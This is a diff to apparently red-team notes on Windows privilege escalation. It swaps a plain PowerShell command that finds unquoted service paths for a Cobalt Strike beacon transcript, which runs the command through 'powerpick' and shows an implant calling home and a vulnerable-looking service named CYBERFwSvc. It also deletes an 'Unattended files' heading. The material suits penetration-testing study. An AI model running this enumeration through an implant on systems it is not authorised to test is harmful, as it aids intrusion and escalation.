@@ -327,10 +327,20 @@ Cmd:
 Powershell: 
 
 ```text
-gwmi win32_service | ?{$_} | where {($_.pathname -ne $null) -and ($_.pathname.trim() -ne "")} | where {-not $_.pathname.StartsWith("`"")} | where {($_.pathname.Substring(0, $_.pathname.IndexOf(".exe") + 4)) -match ". ."} 
-```
+beacon> powerpick gwmi win32_service | ?{$_} | where {($_.pathname -ne $null) -and ($_.pathname.trim() -ne "")} | where {-not $_.pathname.StartsWith("`"")} | where {($_.pathname.Substring(0, $_.pathname.IndexOf(".exe") + 4)) -match ". ."}
+[*] Tasked beacon to run: gwmi win32_service | ?{$_} | where {($_.pathname -ne $null) -and ($_.pathname.trim() -ne "")} | where {-not $_.pathname.StartsWith("`"")} | where {($_.pathname.Substring(0, $_.pathname.IndexOf(".exe") + 4)) -match ". ."} (unmanaged)
+[+] host called home, sent: 134767 bytes
+[+] received output:
 
-## Unattended files
+
+ExitCode  : 1067
+Name      : CYBERFwSvc
+ProcessId : 0
+StartMode : Auto
+State     : Stopped
+Status    : OK
+
+```
 
 It is very common for administrators to use Windows Deployment Services in order to create an image of a Windows operating system and deploy this image in various systems through the network. This is called unattended installation.
 
